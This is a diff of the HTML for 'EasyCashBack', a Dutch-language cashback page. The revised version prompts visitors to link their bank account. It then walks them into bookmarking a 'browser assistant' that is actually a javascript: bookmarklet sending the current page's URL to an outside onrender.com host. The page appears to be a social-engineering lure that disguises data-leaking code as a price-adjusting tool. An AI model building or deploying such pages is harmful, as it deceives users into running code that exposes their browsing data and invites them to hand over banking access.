@@ -7,69 +7,43 @@
     <style>
         :root { --primary: #10b981; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        
-        .container { background: var(--card); width: 100%; max-width: 480px; padding: 40px; border-radius: 28px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
-        h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; letter-spacing: -1px; }
+        .container { background: var(--card); width: 100%; max-width: 480px; padding: 40px; border-radius: 28px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); text-align: center; }
         .status-tag { display: inline-flex; align-items: center; background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 6px 12px; border-radius: 99px; font-size: 13px; font-weight: 600; margin-bottom: 32px; }
         .status-dot { height: 8px; width: 8px; background: #ef4444; border-radius: 50%; margin-right: 8px; }
-
         .card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); padding: 24px; border-radius: 20px; text-align: left; margin-bottom: 20px; }
-        .card h3 { margin: 0 0 8px 0; font-size: 17px; }
-        .card p { margin: 0 0 20px 0; color: #94a3b8; font-size: 14px; line-height: 1.5; }
-
-        .btn { display: block; width: 100%; box-sizing: border-box; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; text-decoration: none; text-align: center; border: none; }
-        .btn-blue { background: #3b82f6; color: white; }
-        .btn-blue:hover { background: #2563eb; transform: translateY(-1px); }
+        .btn { display: block; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; text-decoration: none; text-align: center; border: none; box-sizing: border-box; }
+        .btn-blue { background: #3b82f6; color: white; margin-bottom: 10px; }
         .btn-outline { background: transparent; border: 2px solid var(--primary); color: var(--primary); }
-        .btn-outline:hover { background: var(--primary); color: white; }
-
-        /* Modal styling */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 100; padding: 20px; }
-        .modal-content { background: var(--card); max-width: 500px; margin: 40px auto; padding: 32px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); }
-        .step { display: flex; gap: 16px; margin-bottom: 24px; }
-        .step-icon { background: var(--primary); min-width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(8px); z-index: 100; align-items: center; justify-content: center; }
+        .modal-content { background: var(--card); max-width: 400px; padding: 32px; border-radius: 24px; border: 1px solid var(--primary); }
     </style>
 </head>
 <body>
     <div class="container">
         <h1 style="color: var(--primary);">EasyCashBack</h1>
-        <div class="status-tag"><span class="status-dot"></span> Systeemstatus: Not Connected</div>
-        
+        <div class="status-tag"><span class="status-dot"></span> Systeemstatus: Niet Gekoppeld</div>
         <div class="card">
-            <h3>Account Configuratie</h3>
-            <p>Activeer je beveiligde omgeving om automatische kortingen te kunnen ontvangen.</p>
-            <form action="/create-checkout-session" method="POST">
-                <button type="submit" class="btn btn-blue">Koppel veilig via hier</button>
-            </form>
+            <h3 style="margin:0;">Stap 1: Beveiliging</h3>
+            <p style="color:#94a3b8; font-size:14px;">Koppel je bankrekening voor automatische cashback.</p>
+            <form action="/create-checkout-session" method="POST"><button type="submit" class="btn btn-blue">Koppel veilig via hier</button></form>
         </div>
-
         <div class="card">
-            <h3>Systeem Integratie</h3>
-            <p>Krijg toegang tot de technische werking en activeer de browser-assistent.</p>
+            <h3 style="margin:0;">Stap 2: Systeem</h3>
+            <p style="color:#94a3b8; font-size:14px;">Activeer de techniek achter de schermen.</p>
             <button class="btn btn-outline" onclick="openModal()">Achter de schermen</button>
         </div>
     </div>
-
     <div id="setupModal" class="modal">
         <div class="modal-content">
-            <h2 style="margin-top:0;">Hoe het werkt</h2>
-            <div class="step">
-                <div class="step-icon">1</div>
-                <div><strong>Data Verificatie</strong><br><small style="color:#94a3b8">Het systeem koppelt je aankoop aan beschikbare cashback-funds.</small></div>
-            </div>
-            <div class="step">
-                <div class="step-icon">2</div>
-                <div><strong>Browser Injectie</strong><br><small style="color:#94a3b8">Onze tool herkent retailers en past prijzen real-time aan.</small></div>
-            </div>
-            <hr style="border:0; border-top:1px solid rgba(255,255,255,0.1); margin:24px 0;">
-            <p style="font-size:14px; margin-bottom:20px;">Sla de tool op in je bladwijzerbalk (Ctrl+D):</p>
-            <a href="javascript:(function(){window.location.href='https://mijn-stripe-app.onrender.com/scan?ref='+encodeURIComponent(window.location.href);})();" class="btn btn-blue">🚀 Activeer Browser Tool</a>
-            <button onclick="closeModal()" style="background:none; border:none; color:#64748b; width:100%; margin-top:16px; cursor:pointer;">Sluiten</button>
+            <h2 style="color:var(--primary);">Systeem Activatie</h2>
+            <p>Klik op de knop en druk op <b>Ctrl+D</b> om de assistent op te slaan in je browser.</p>
+            <a href="javascript:(function(){window.location.href='https://mijn-stripe-app.onrender.com/scan?ref='+encodeURIComponent(window.location.href);})();" 
+               class="btn btn-blue" style="background:var(--primary)" onclick="alert('Druk nu op Ctrl+D!')">🚀 ACTIVEER ASSISTENT</a>
+            <button onclick="closeModal()" style="background:none; border:none; color:#ef4444; cursor:pointer; width:100%;">Sluiten</button>
         </div>
     </div>
-
     <script>
-        function openModal() { document.getElementById('setupModal').style.display = 'block'; }
+        function openModal() { document.getElementById('setupModal').style.display = 'flex'; }
         function closeModal() { document.getElementById('setupModal').style.display = 'none'; }
     </script>
 </body>
